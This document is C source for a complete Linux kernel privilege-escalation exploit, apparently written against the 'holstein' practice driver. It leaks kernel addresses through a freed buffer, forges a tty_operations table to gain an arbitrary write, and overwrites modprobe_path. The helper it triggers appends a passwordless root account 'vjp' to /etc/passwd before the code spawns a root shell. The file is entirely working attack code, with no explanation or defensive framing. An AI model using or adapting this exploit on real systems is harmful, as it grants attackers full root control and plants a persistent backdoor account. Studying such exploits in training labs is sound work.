#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <string.h>
#include "tty.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
    // // // system("/bin/sh");
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}

#define pause() getchar()
#define BUFFER_SIZE 0x400
#define dev_file "/dev/holstein"
int global_fd;
int dup_fd;
void open_dev(){
    global_fd = open(dev_file,O_RDWR);
    dup_fd    = open(dev_file,O_RDWR);
    if(global_fd < 0 || dup_fd < 0)
        errExit("open");
    log_info("Opened dev file");
}
char buf[BUFFER_SIZE];
void read_dev(int target_fd){
    read(target_fd,buf,BUFFER_SIZE);
}
void write_dev(int target_fd){
    write(target_fd,buf,BUFFER_SIZE);
}

int ptmx_fd;
int64_t _text,g_buf,modprobe_path;

void AAW_32(int32_t value,int32_t* addr){
    ioctl(ptmx_fd,value,addr);
}

int main(int argc,char** argv,char **envp){
    //prepare shell for priv
    system("echo -e \"#!/bin/sh\necho 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\" > /tmp/vjp");
    system("chmod +x /tmp/vjp");
    save_state();
    open_dev();
    close(dup_fd);
    ptmx_fd = open("/dev/ptmx",O_RDONLY);
    if(ptmx_fd < 0)
        errExit("ptmx");
    read_dev(global_fd);
    int64_t* leak =(int64_t *)buf;
    _text = leak[3]-0xc39c60;
    log_info("Leak kernel .data: 0x%lx",leak[3]);
    log_info("-> _text @ 0x%lx",_text);
    g_buf = leak[7]-0x38;
    log_info("g_buf = 0x%lx",g_buf);
    modprobe_path = _text + 0xe38480;
    struct tty_operations fake_tty ={0};
    fake_tty.ioctl = _text+0xb8c95; // mov qword ptr [rdx], rsi ; ret
    memcpy(&buf[0x2e0],&fake_tty,sizeof(fake_tty)); // size of tty_struct is 0x2e0;
    leak[3] = g_buf+0x2e0;
    write_dev(global_fd);
    int32_t* p =(int32_t *)"/tmp/vjp";
    AAW_32(p[0],(int32_t* )modprobe_path);
    AAW_32(p[1],(int32_t *)(modprobe_path+4));
    
    system("echo -e '\x13\x37\x42\x42' > /tmp/pwn" ); //Non-ascii for /tmp/pwn
    system("chmod +x /tmp/pwn"); 
    system("/tmp/pwn" );  // trigger call modprobe_path
    system("cat /etc/passwd");
    system("su vjp ; /bin/sh");
}
